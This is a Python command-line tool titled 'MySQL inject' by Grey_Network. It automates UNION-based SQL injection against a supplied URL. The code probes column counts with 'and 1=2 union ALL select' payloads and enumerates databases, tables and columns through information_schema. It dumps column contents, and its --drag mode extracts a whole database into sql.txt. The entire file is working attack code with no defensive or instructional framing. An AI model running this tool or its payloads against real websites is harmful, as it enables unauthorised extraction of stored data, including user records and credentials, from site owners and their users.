#!/usr/bin/python3
# _*_ coding: utf-8 _*_


#+-------------------------------+
#|        MySQL inject           |
#|                               |
#|        by Grey_Network        |
#|                               |
#|        Version 1.0            |
#--------------------------------+



import requests
import getopt
import re
import sys
from re import search



class Start:
    def main(self):
        try:
            opts,args = getopt.getopt(sys.argv[1:],"u:p:v:d:t:c:h",["help","current-db","dbs","tables","columns","dump","drag"])
            url = ''
            db_name = ''
            table_name = ''
            column_name = ''
            v = 'str'
            payload = ''
            data = '0'
            for op,value in opts:
                if(op in ('-h','--help')):
                    print('Usage: python mysqli.py [option]')
                    print('\noption: (-u,-d,-t,-c,-v,-p)\n')
                elif(op == '-u'):
                    url = value
                elif(op == '-d'):
                    db_name = value
                elif(op == '-t'):
                    table_name = value
                elif(op == '-c'):
                    column_name = value
                elif(op == '-v'):
                    if(value == 'int'):
                        v = value
                    if(value == 'str'):
                        v = value
                    if(value == 'the'):
                        v = value
                elif(op == '-p'):
                    filedir = open(value)
                    payload = filedir.read()
                elif(op == '--current-db'):
                    if(url != None):
                        data = '1'
                        if(data == '1'):
                            self.current_db(url,v,payload)
                elif(op == '--dbs'):
                    if(url != None):
                        data = '2'
                        if(data == '2'):
                            self.dbs(url,v,payload)
                elif(op == '--tables'):
                    if(url != None):
                        if(db_name != None):
                            data = '3'
                            if(data == '3'):
                                self.tables(url,db_name,v,payload)
                elif(op == '--columns'):
                    if(url != None):
                        if(db_name != None):
                            if(table_name != None):
                                data = '4'
                                if(data == '4'):
                                    self.columns(url,db_name,table_name,v,payload)
                elif(op == '--dump'):
                    if(url != None):
                        if(db_name != None):
                            if(table_name != None):
                                if(column_name != None):
                                    data = '5'
                                    if(data == '5'):
                                        self.dump(url,db_name,table_name,column_name,v,payload)
                elif(op == '--drag'):
                    if(url != None):
                        if(db_name != None):
                            data = '6'
                            if(data == '6'):
                                self.drag(url,db_name,v,payload)
            if(url != None):
                if(data == '0'):
                    self.judge(url,v,payload)

        except Exception as e:
            pass
    def drag(self,url,db_name,v,payload):
        table_result = []
        column_result = []
        dump_result = []
        cat = ''
        if(payload == ''):
            for g in range(1,32):
                g = g + 1
                if(g!=1):
                    if(v == 'str'):
                        cat+=',Null'
                        union = '%20and%201=2%20union%20ALL%20select%20Null,group_concat(0x3c3c3c3c3c3c3c3c3c3c,0x677773,0x3e3e3e3e3e3e3e3e3e3e)'+cat
                        union_get = requests.get(url+union)
                        union_get.encoding = 'utf-8'
                        union_h = union_get.text
                        if search('<<<<<<<<<<gws>>>>>>>>>>',union_h):
                            db_tmp = db_name
                            db_name = db_name.encode(encoding='utf-8')
                            db_name16 = db_name.hex()
                            payload = union
                            payload = payload.replace('0x677773','table_name')+'%20from%20information_schema.tables%20where%20table_schema=0x'+db_name16
                            dbs_get = requests.get(url+payload)
                            dbs_get.encoding = 'utf-8'
                            dbs_h = dbs_get.text
                            z1 = '<<<<<<<<<<'
                            z2 = '>>>>>>>>>>'
                            pat = re.compile(z1+'(.*?)'+z2,re.S)
                            table_res = pat.findall(dbs_h)
                            table_result.append(pat.findall(dbs_h))
                            for line in table_res:
                                table_name = line
                                union = '%20and%201=2%20union%20ALL%20select%20Null,group_concat(0x3c3c3c3c3c3c3c3c3c3c,0x677773,0x3e3e3e3e3e3e3e3e3e3e)'+cat
                                union_get = requests.get(url+union)
                                union_get.encoding = 'utf-8'
                                union_h = union_get.text
                                if search('<<<<<<<<<<gws>>>>>>>>>>',union_h):
                                    table_tmp = table_name
                                    table_name = table_name.encode(encoding='utf-8')
                                    table_name16 = table_name.hex()
                                    payload = union
                                    payload = payload.replace('0x677773','column_name')+'%20from%20information_schema.columns%20where%20table_schema=0x'+db_name16+'%20and%20table_name=0x'+table_name16
                                    dbs_get = requests.get(url+payload)
                                    dbs_get.encoding = 'utf-8'
                                    dbs_h = dbs_get.text
                                    z1 = '<<<<<<<<<<'
                                    z2 = '>>>>>>>>>>'
                                    pat = re.compile(z1+'(.*?)'+z2,re.S)
                                    column_res = pat.findall(dbs_h)
                                    column_result.append(pat.findall(dbs_h))
                                    for lined in column_res:
                                        column_name = lined
                                        union = '%20and%201=2%20union%20ALL%20select%20Null,group_concat(0x3c3c3c3c3c3c3c3c3c3c,0x677773,0x3e3e3e3e3e3e3e3e3e3e)'+cat
                                        union_get = requests.get(url+union)
                                        union_get.encoding = 'utf-8'
                                        union_h = union_get.text
                                        if search('<<<<<<<<<<gws>>>>>>>>>>',union_h):
                                            payload = union
                                            payload = payload.replace('0x677773',column_name)+'%20from%20'+db_tmp+'.'+line
                                            dbs_get = requests.get(url+payload)
                                            dbs_get.encoding = 'utf-8'
                                            dbs_h = dbs_get.text
                                            z1 = '<<<<<<<<<<'
                                            z2 = '>>>>>>>>>>'
                                            j = '\n| [+] '
                                            pat = re.compile(z1+'(.*?)'+z2,re.S)
                                            dump_res = pat.findall(dbs_h)
                                            dump_result.append(pat.findall(dbs_h))
                                            num = '\n[ Table => '+line+' ] [ Column => '+lined+' ] : \n\n[ Dump ] \n\n+------------------+\n'
                                            w = num+'| [+] '+j.join(dump_res)+'\n+------------------+\n'
                                            file_write_obj = open('sql.txt','a')                           
                                            file_write_obj.writelines(w)
                                            print(w)
                    if(v == 'int'):
                        cat+=','+str(g+1)
                        union = '%20and%201=2%20union%20ALL%20select%201,group_concat(0x3c3c3c3c3c3c3c3c3c3c,0x677773,0x3e3e3e3e3e3e3e3e3e3e)'+cat
                        union_get = requests.get(url+union)
                        union_get.encoding = 'utf-8'
                        union_h = union_get.text
                        if search('<<<<<<<<<<gws>>>>>>>>>>',union_h):
                            db_tmp = db_name
                            db_name = db_name.encode(encoding='utf-8')
                            db_name16 = db_name.hex()
                            payload = union
                            payload = payload.replace('0x677773','table_name')+'%20from%20information_schema.tables%20where%20table_schema=0x'+db_name16
                            dbs_get = requests.get(url+payload)
                            dbs_get.encoding = 'utf-8'
                            dbs_h = dbs_get.text
                            z1 = '<<<<<<<<<<'
                            z2 = '>>>>>>>>>>'
                            pat = re.compile(z1+'(.*?)'+z2,re.S)
                            table_res = pat.findall(dbs_h)
                            table_result.append(pat.findall(dbs_h))
                            for line in table_res:
                                table_name = line
                                union = '%20and%201=2%20union%20ALL%20select%201,group_concat(0x3c3c3c3c3c3c3c3c3c3c,0x677773,0x3e3e3e3e3e3e3e3e3e3e)'+cat
                                union_get = requests.get(url+union)
                                union_get.encoding = 'utf-8'
                                union_h = union_get.text
                                if search('<<<<<<<<<<gws>>>>>>>>>>',union_h):
                                    table_tmp = table_name
                                    table_name = table_name.encode(encoding='utf-8')
                                    table_name16 = table_name.hex()
                                    payload = union
                                    payload = payload.replace('0x677773','column_name')+'%20from%20information_schema.columns%20where%20table_schema=0x'+db_name16+'%20and%20table_name=0x'+table_name16
                                    dbs_get = requests.get(url+payload)
                                    dbs_get.encoding = 'utf-8'
                                    dbs_h = dbs_get.text
                                    z1 = '<<<<<<<<<<'
                                    z2 = '>>>>>>>>>>'
                                    pat = re.compile(z1+'(.*?)'+z2,re.S)
                                    column_res = pat.findall(dbs_h)
                                    column_result.append(pat.findall(dbs_h))
                                    for lined in column_res:
                                        column_name = lined
                                        union = '%20and%201=2%20union%20ALL%20select%201,group_concat(0x3c3c3c3c3c3c3c3c3c3c,0x677773,0x3e3e3e3e3e3e3e3e3e3e)'+cat
                                        union_get = requests.get(url+union)
                                        union_get.encoding = 'utf-8'
                                        union_h = union_get.text
                                        if search('<<<<<<<<<<gws>>>>>>>>>>',union_h):
                                            payload = union
                                            payload = payload.replace('0x677773',column_name)+'%20from%20'+db_tmp+'.'+line
                                            dbs_get = requests.get(url+payload)
                                            dbs_get.encoding = 'utf-8'
                                            dbs_h = dbs_get.text
                                            z1 = '<<<<<<<<<<'
                                            z2 = '>>>>>>>>>>'
                                            j = '\n| [+] '
                                            pat = re.compile(z1+'(.*?)'+z2,re.S)
                                            dump_res = pat.findall(dbs_h)
                                            dump_result.append(pat.findall(dbs_h))
                                            num = '\n[ Table => '+line+' ] [ Column => '+lined+' ] : \n\n[ Dump ] \n\n+------------------+\n'
                                            w = num+'| [+] '+j.join(dump_res)+'\n+------------------+\n'
                                            file_write_obj = open('sql.txt','a')                           
                                            file_write_obj.writelines(w)
                                            print(w)
        else:
            db_tmp = db_name
            db_name = db_name.encode(encoding='utf-8')
            db_name16 = db_name.hex()
            union = payload
            union = union.replace('0x677773','table_name')+'%20from%20information_schema.tables%20where%20table_schema=0x'+db_name16
            dbs_get = requests.get(url+union)
            dbs_get.encoding = 'utf-8'
            dbs_h = dbs_get.text
            z1 = '<<<<<<<<<<'
            z2 = '>>>>>>>>>>'
            pat = re.compile(z1+'(.*?)'+z2,re.S)
            table_res = pat.findall(dbs_h)
            table_result.append(pat.findall(dbs_h))
            for line in table_res:
                table_name = line
                table_tmp = table_name
                table_name = table_name.encode(encoding='utf-8')
                table_name16 = table_name.hex()
                union = payload
                union = union.replace('0x677773','column_name')+'%20from%20information_schema.columns%20where%20table_schema=0x'+db_name16+'%20and%20table_name=0x'+table_name16
                dbs_get = requests.get(url+union)
                dbs_get.encoding = 'utf-8'
                dbs_h = dbs_get.text
                z1 = '<<<<<<<<<<'
                z2 = '>>>>>>>>>>'
                pat = re.compile(z1+'(.*?)'+z2,re.S)
                column_res = pat.findall(dbs_h)
                column_result.append(pat.findall(dbs_h))
                for lined in column_res:
                    column_name = lined
                    union = payload
                    union = union.replace('0x677773',column_name)+'%20from%20'+db_tmp+'.'+line
                    dbs_get = requests.get(url+union)
                    dbs_get.encoding = 'utf-8'
                    dbs_h = dbs_get.text
                    z1 = '<<<<<<<<<<'
                    z2 = '>>>>>>>>>>'
                    j = '\n| [+] '
                    pat = re.compile(z1+'(.*?)'+z2,re.S)
                    dump_res = pat.findall(dbs_h)
                    dump_result.append(pat.findall(dbs_h))
                    num = '\n[ Table => '+line+' ] [ Column => '+lined+' ] : \n\n[ Dump ] \n\n+------------------+\n'
                    w = num+'| [+] '+j.join(dump_res)+'\n+------------------+\n'
                    file_write_obj = open('sql.txt','a')                           
                    file_write_obj.writelines(w)
                    print(w)
    def current_db(self,url,v,payload):
        cat = ''
        if(payload == ''):
            for g in range(1,32):
                g = g + 1
                if(g!=1):
                    if(v == 'str'):
                        cat+=',Null'
                        union = '%20and%201=2%20union%20ALL%20select%20Null,group_concat(0x3c3c3c3c3c3c3c3c3c3c,0x677773,0x3e3e3e3e3e3e3e3e3e3e)'+cat
                        union_get = requests.get(url+union)
                        union_get.encoding = 'utf-8'
                        union_h = union_get.text
                        if search('<<<<<<<<<<gws>>>>>>>>>>',union_h):
                            payload = union
                            payload = payload.replace('0x677773','database()')
                            dbs_get = requests.get(url+payload)
                            dbs_get.encoding = 'utf-8'
                            dbs_h = dbs_get.text
                            z1 = '<<<<<<<<<<'
                            z2 = '>>>>>>>>>>'
                            j = '\n'
                            pat = re.compile(z1+'(.*?)'+z2,re.S)
                            result = pat.findall(dbs_h)
                            print('\n[ current db ] => '+j.join(result)+'\n')
                    if(v == 'int'):
                        cat+=','+str(g+1)
                        union = '%20and%201=2%20union%20ALL%20select%20Null,group_concat(0x3c3c3c3c3c3c3c3c3c3c,0x677773,0x3e3e3e3e3e3e3e3e3e3e)'+cat
                        union_get = requests.get(url+union)
                        union_get.encoding = 'utf-8'
                        union_h = union_get.text
                        if search('<<<<<<<<<<gws>>>>>>>>>>',union_h):
                            payload = union
                            payload = payload.replace('0x677773','database()')
                            dbs_get = requests.get(url+payload)
                            dbs_get.encoding = 'utf-8'
                            dbs_h = dbs_get.text
                            z1 = '<<<<<<<<<<'
                            z2 = '>>>>>>>>>>'
                            j = '\n'
                            pat = re.compile(z1+'(.*?)'+z2,re.S)
                            result = pat.findall(dbs_h)
                            print('\n[ current db ] => '+j.join(result)+'\n')
        else:
            payload = payload.replace('0x677773','database()')
            dbs_get = requests.get(url+payload)
            dbs_get.encoding = 'utf-8'
            dbs_h = dbs_get.text
            z1 = '<<<<<<<<<<'
            z2 = '>>>>>>>>>>'
            j = '\n'
            pat = re.compile(z1+'(.*?)'+z2,re.S)
            result = pat.findall(dbs_h)
            print('\n[ current db ] => '+j.join(result)+'\n')
            print('Payload: '+payload+'\n')

    def dump(self,url,db_name,table_name,column_name,v,payload):
        cat = ''
        if(payload == ''):
            for g in range(1,32):
                g = g + 1
                if(g!=1):
                    if(v == 'str'):
                        cat+=',Null'
                        union = '%20and%201=2%20union%20ALL%20select%20Null,group_concat(0x3c3c3c3c3c3c3c3c3c3c,0x677773,0x3e3e3e3e3e3e3e3e3e3e)'+cat
                        union_get = requests.get(url+union)
                        union_get.encoding = 'utf-8'
                        union_h = union_get.text
                        if search('<<<<<<<<<<gws>>>>>>>>>>',union_h):
                            payload = union
                            payload = payload.replace('0x677773',column_name)+'%20from%20'+db_name+'.'+table_name
                            dbs_get = requests.get(url+payload)
                            dbs_get.encoding = 'utf-8'
                            dbs_h = dbs_get.text
                            z1 = '<<<<<<<<<<'
                            z2 = '>>>>>>>>>>'
                            j = '\n| [+] '
                            pat = re.compile(z1+'(.*?)'+z2,re.S)
                            result = pat.findall(dbs_h)
                            num = '\n[ Database => '+str(db_name)+' ] [ Table => '+str(table_name)+' ] [ Column => '+str(column_name)+' ] : \n\n[ Dump ] \n\n+------------------+\n'
                            print(num+'| [+] '+j.join(result))
                    if(v == 'int'):
                        cat+=','+str(g+1)
                        union = '%20and%201=2%20union%20ALL%20select%20Null,group_concat(0x3c3c3c3c3c3c3c3c3c3c,0x677773,0x3e3e3e3e3e3e3e3e3e3e)'+cat
                        union_get = requests.get(url+union)
                        union_get.encoding = 'utf-8'
                        union_h = union_get.text
                        if search('<<<<<<<<<<gws>>>>>>>>>>',union_h):
                            payload = union
                            payload = payload.replace('0x677773',column_name)+'%20from%20'+db_name+'.'+table_name
                            dbs_get = requests.get(url+payload)
                            dbs_get.encoding = 'utf-8'
                            dbs_h = dbs_get.text
                            z1 = '<<<<<<<<<<'
                            z2 = '>>>>>>>>>>'
                            j = '\n| [+] '
                            pat = re.compile(z1+'(.*?)'+z2,re.S)
                            result = pat.findall(dbs_h)
                            num = '\n[ Database => '+str(db_name)+' ] [ Table => '+str(table_name)+' ] [ Column => '+str(column_name)+' ] : \n\n[ Dump ] \n\n+------------------+\n'
                            print(num+'| [+] '+j.join(result))

            print('+------------------+\n')
            print('Payload: '+payload+'\n')
        else:
            payload = payload.replace('0x677773',column_name)+'%20from%20'+db_name+'.'+table_name
            dbs_get = requests.get(url+payload)
            dbs_get.encoding = 'utf-8'
            dbs_h = dbs_get.text
            z1 = '<<<<<<<<<<'
            z2 = '>>>>>>>>>>'
            j = '\n| [+] '
            pat = re.compile(z1+'(.*?)'+z2,re.S)
            result = pat.findall(dbs_h)
            num = '\n[ Database => '+str(db_name)+' ] [ Table => '+str(table_name)+' ] [ Column => '+str(column_name)+' ] : \n\n[ Dump ] \n\n+------------------+\n'
            print(num+'| [+] '+j.join(result))

            print('+------------------+\n')
            print('Payload: '+payload+'\n')
    def columns(self,url,db_name,table_name,v,payload):
        cat = ''
        if(payload == ''):
            for g in range(1,32):
                g = g + 1
                if(g!=1):
                    if(v=='str'):
                        cat+=',Null'
                        union = '%20and%201=2%20union%20ALL%20select%20Null,group_concat(0x3c3c3c3c3c3c3c3c3c3c,0x677773,0x3e3e3e3e3e3e3e3e3e3e)'+cat
                        union_get = requests.get(url+union)
                        union_get.encoding = 'utf-8'
                        union_h = union_get.text
                        if search('<<<<<<<<<<gws>>>>>>>>>>',union_h):
                            db_tmp = db_name
                            db_name = db_name.encode(encoding='utf-8')
                            db_name16 = db_name.hex()
                            table_tmp = table_name
                            table_name = table_name.encode(encoding='utf-8')
                            table_name16 = table_name.hex()
                            payload = union
                            payload = payload.replace('0x677773','column_name')+'%20from%20information_schema.columns%20where%20table_schema=0x'+db_name16+'%20and%20table_name=0x'+table_name16
                            dbs_get = requests.get(url+payload)
                            dbs_get.encoding = 'utf-8'
                            dbs_h = dbs_get.text
                            z1 = '<<<<<<<<<<'
                            z2 = '>>>>>>>>>>'
                            j = '\n| [+] '
                            pat = re.compile(z1+'(.*?)'+z2,re.S)
                            result = pat.findall(dbs_h)
                            num = '\n[ Database => '+str(db_tmp)+' ] [ Table => '+str(table_tmp)+' ] :\n\n[ '+str(len(result))+' columns ]\n\n+------------------+\n'
                            print(num+'| [+] '+j.join(result))
                    if(v=='int'):
                        cat+=','+str(g+1)
                        union = '%20and%201=2%20union%20ALL%20select%201,group_concat(0x3c3c3c3c3c3c3c3c3c3c,0x677773,0x3e3e3e3e3e3e3e3e3e3e)'+cat
                        union_get = requests.get(url+union)
                        union_get.encoding = 'utf-8'
                        union_h = union_get.text
                        if search('<<<<<<<<<<gws>>>>>>>>>>',union_h):
                            db_tmp = db_name
                            db_name = db_name.encode(encoding='utf-8')
                            db_name16 = db_name.hex()
                            table_tmp = table_name
                            table_name = table_name.encode(encoding='utf-8')
                            table_name16 = table_name.hex()
                            payload = union
                            payload = payload.replace('0x677773','column_name')+'%20from%20information_schema.columns%20where%20table_schema=0x'+db_name16+'%20and%20table_name=0x'+table_name16
                            dbs_get = requests.get(url+payload)
                            dbs_get.encoding = 'utf-8'
                            dbs_h = dbs_get.text
                            z1 = '<<<<<<<<<<'
                            z2 = '>>>>>>>>>>'
                            j = '\n| [+] '
                            pat = re.compile(z1+'(.*?)'+z2,re.S)
                            result = pat.findall(dbs_h)
                            num = '\n[ Database => '+str(db_tmp)+' ] [ Table => '+str(table_tmp)+' ] :\n\n[ '+str(len(result))+' columns ]\n\n+------------------+\n'
                            print(num+'| [+] '+j.join(result))

            print('+------------------+\n')
            print('Payload: '+payload+'\n')
        else:
            db_tmp = db_name
            db_name = db_name.encode(encoding='utf-8')
            db_name16 = db_name.hex()
            table_tmp = table_name
            table_name = table_name.encode(encoding='utf-8')
            table_name16 = table_name.hex()
            payload = payload.replace('0x677773','column_name')+'%20from%20information_schema.columns%20where%20table_schema=0x'+db_name16+'%20and%20table_name=0x'+table_name16
            dbs_get = requests.get(url+payload)
            dbs_get.encoding = 'utf-8'
            dbs_h = dbs_get.text
            z1 = '<<<<<<<<<<'
            z2 = '>>>>>>>>>>'
            j = '\n| [+] '
            pat = re.compile(z1+'(.*?)'+z2,re.S)
            result = pat.findall(dbs_h)
            num = '\n[ Database => '+str(db_tmp)+' ] [ Table => '+str(table_tmp)+' ] :\n\n[ '+str(len(result))+' columns ]\n\n+------------------+\n'
            print(num+'| [+] '+j.join(result))
            print('+------------------+\n')
            print('Payload: '+payload+'\n')
    def tables(self,url,db_name,v,payload):
        cat = ''
        if(payload == ''):
            for g in range(1,32):
                g = g + 1
                if(g!=1):
                    if(v=='str'):
                        cat+=',Null'
                        union = '%20and%201=2%20union%20ALL%20select%20Null,group_concat(0x3c3c3c3c3c3c3c3c3c3c,0x677773,0x3e3e3e3e3e3e3e3e3e3e)'+cat
                        union_get = requests.get(url+union)
                        union_get.encoding = 'utf-8'
                        union_h = union_get.text
                        if search('<<<<<<<<<<gws>>>>>>>>>>',union_h):
                            db_tmp = db_name
                            db_name = db_name.encode(encoding='utf-8')
                            db_name16 = db_name.hex()
                            payload = union
                            payload = payload.replace('0x677773','table_name')+'%20from%20information_schema.tables%20where%20table_schema=0x'+db_name16
                            dbs_get = requests.get(url+payload)
                            dbs_get.encoding = 'utf-8'
                            dbs_h = dbs_get.text
                            z1 = '<<<<<<<<<<'
                            z2 = '>>>>>>>>>>'
                            j = '\n| [+] '
                            pat = re.compile(z1+'(.*?)'+z2,re.S)
                            result = pat.findall(dbs_h)
                            num = '\n[ Database ] => '+str(db_tmp)+' :\n\n[ '+str(len(result))+' tables ]\n\n+------------------+\n'
                            print(num+'| [+] '+j.join(result))
                    if(v=='int'):
                        cat+=','+str(g+1)
                        union = '%20and%201=2%20union%20ALL%20select%20Null,group_concat(0x3c3c3c3c3c3c3c3c3c3c,0x677773,0x3e3e3e3e3e3e3e3e3e3e)'+cat
                        union_get = requests.get(url+union)
                        union_get.encoding = 'utf-8'
                        union_h = union_get.text
                        if search('<<<<<<<<<<gws>>>>>>>>>>',union_h):
                            db_tmp = db_name
                            db_name = db_name.encode(encoding='utf-8')
                            db_name16 = db_name.hex()
                            payload = union
                            payload = payload.replace('0x677773','table_name')+'%20from%20information_schema.tables%20where%20table_schema=0x'+db_name16
                            dbs_get = requests.get(url+payload)
                            dbs_get.encoding = 'utf-8'
                            dbs_h = dbs_get.text
                            z1 = '<<<<<<<<<<'
                            z2 = '>>>>>>>>>>'
                            j = '\n| [+] '
                            pat = re.compile(z1+'(.*?)'+z2,re.S)
                            result = pat.findall(dbs_h)
                            num = '\n[ Database ] => '+str(db_tmp)+' :\n\n[ '+str(len(result))+' tables ]\n\n+------------------+\n'
                            print(num+'| [+] '+j.join(result))
            print('+------------------+\n')
            print('Payload: '+payload+'\n')
        else:
            db_tmp = db_name
            db_name = db_name.encode(encoding='utf-8')
            db_name16 = db_name.hex()
            payload = payload.replace('0x677773','table_name')+'%20from%20information_schema.tables%20where%20table_schema=0x'+db_name16
            dbs_get = requests.get(url+payload)
            dbs_get.encoding = 'utf-8'
            dbs_h = dbs_get.text
            z1 = '<<<<<<<<<<'
            z2 = '>>>>>>>>>>'
            j = '\n| [+] '
            pat = re.compile(z1+'(.*?)'+z2,re.S)
            result = pat.findall(dbs_h)
            num = '\n[ Database ] => '+str(db_tmp)+' :\n\n[ '+str(len(result))+' tables ]\n\n+------------------+\n'
            print(num+'| [+] '+j.join(result))
            print('+------------------+\n')
            print('Payload: '+payload+'\n')

    def dbs(self,url,v,payload):
        cat = ''
        if(payload == ''):
            for g in range(1,32):
                g = g + 1
                if(g!=1):
                    if(v=='str'):
                        cat+=',Null'
                        union = '%20and%201=2%20union%20ALL%20select%20Null,group_concat(0x3c3c3c3c3c3c3c3c3c3c,0x677773,0x3e3e3e3e3e3e3e3e3e3e)'+cat
                        union_get = requests.get(url+union)
                        union_get.encoding = 'utf-8'
                        union_h = union_get.text
                        if search('<<<<<<<<<<gws>>>>>>>>>>',union_h):
                            payload = union
                            payload = payload.replace('0x677773','schema_name')+'%20from%20information_schema.schemata'
                            dbs_get = requests.get(url+payload)
                            dbs_get.encoding = 'utf-8'
                            dbs_h = dbs_get.text
                            z1 = '<<<<<<<<<<'
                            z2 = '>>>>>>>>>>'

                            j = '\n[+] '
                            pat = re.compile(z1+'(.*?)'+z2,re.S)
                            result = pat.findall(dbs_h)
                            num = '\navailable databases [ '+str(len(result))+' ]:\n\n'
                            print(num+'[+] '+j.join(result))
                            print('\n')
                            print('Payload: '+payload+'\n')
                    if(v=='int'):
                        cat+=','+str(g+1)
                        union = '%20and%201=2%20union%20ALL%20select%201,group_concat(0x3c3c3c3c3c3c3c3c3c3c,0x677773,0x3e3e3e3e3e3e3e3e3e3e)'+cat
                        union_get = requests.get(url+union)
                        union_get.encoding = 'utf-8'
                        union_h = union_get.text
                        if search('<<<<<<<<<<gws>>>>>>>>>>',union_h):
                            payload = union
                            payload = payload.replace('0x677773','schema_name')+'%20from%20information_schema.schemata'
                            dbs_get = requests.get(url+payload)
                            dbs_get.encoding = 'utf-8'
                            dbs_h = dbs_get.text
                            z1 = '<<<<<<<<<<'
                            z2 = '>>>>>>>>>>'

                            j = '\n[+] '
                            pat = re.compile(z1+'(.*?)'+z2,re.S)
                            result = pat.findall(dbs_h)
                            num = '\navailable databases [ '+str(len(result))+' ]:\n\n'
                            print(num+'[+] '+j.join(result))
                            print('\n')
                            print('Payload: '+payload+'\n')
        else:
            payload = payload.replace('0x677773','schema_name')+'%20from%20information_schema.schemata'
            dbs_get = requests.get(url+payload)
            dbs_get.encoding = 'utf-8'
            dbs_h = dbs_get.text
            z1 = '<<<<<<<<<<'
            z2 = '>>>>>>>>>>'

            j = '\n[+] '
            pat = re.compile(z1+'(.*?)'+z2,re.S)
            result = pat.findall(dbs_h)
            num = '\navailable databases [ '+str(len(result))+' ]:\n\n'
            print(num+'[+] '+j.join(result))
            print('\n')
            print('Payload: '+payload+'\n')

    def judge(self,url,v,payload):
        url_get = requests.get(url)
        url_get.encoding = 'utf-8'
        url_h = url_get.text
        and_get = requests.get(url+'%20AND%209125=9125')
        and_get.encoding = 'utf-8'
        and_h = and_get.text
        cat = ''
        for z in range(1,32):
            z = z + 1
            if(z!=1):
                if(v=='str'):
                    cat+=',Null'
                    union = '%20and%201=2%20union%20ALL%20select%20Null,group_concat(0x3c3c3c3c3c3c3c3c3c3c,0x677773,0x3e3e3e3e3e3e3e3e3e3e)'+cat
                    union_get = requests.get(url+union)
                    union_get.encoding = 'utf-8'
                    union_h = union_get.text
                    if search('<<<<<<<<<<gws>>>>>>>>>>',union_h):
                        payload = union
                        print('Payload: '+payload+'\n')
                if(v=='int'):
                    cat+=','+str(z+1)
                    union = '%20and%201=2%20union%20ALL%20select%201,group_concat(0x3c3c3c3c3c3c3c3c3c3c,0x677773,0x3e3e3e3e3e3e3e3e3e3e)'+cat
                    union_get = requests.get(url+union)
                    union_get.encoding = 'utf-8'
                    union_h = union_get.text
                    if search('<<<<<<<<<<gws>>>>>>>>>>',union_h):
                        payload = union
                        print('Payload: '+payload+'\n')
                if(v=='the'):
                    cat+=','+str(z+1)
                    union = '%20and%201=1%20union%20ALL%20select%201'+cat
                    union_get = requests.get(url+union)
                    union_get.encoding = 'utf-8'
                    union_h = union_get.text
                    if(union_h == url_h):
                        print('Payload: '+union+'\n')

        if(url_h == and_h):
            print('Payload: AND 9125=9125\n')


if __name__ == '__main__':
    ver ='\n+--------------------------------------------+\n'
    ver += '|    ##########   ************************   |\n'
    ver += '|   #+#    #+#    *                      *   |\n'
    ver += '|   +:+           *   MySQL inject       *   |\n'
    ver += '|    +#++:++#+    *                      *   |\n'
    ver += '|          +:+    *   by Grey_Network    *   |\n'
    ver += '|    :+:    :+:   *                      *   |\n'
    ver += '|    :::::::+:    ************************   |\n'
    ver += '+--------------------------------------------+\n'
    print(ver)
    start = Start()
    start.main()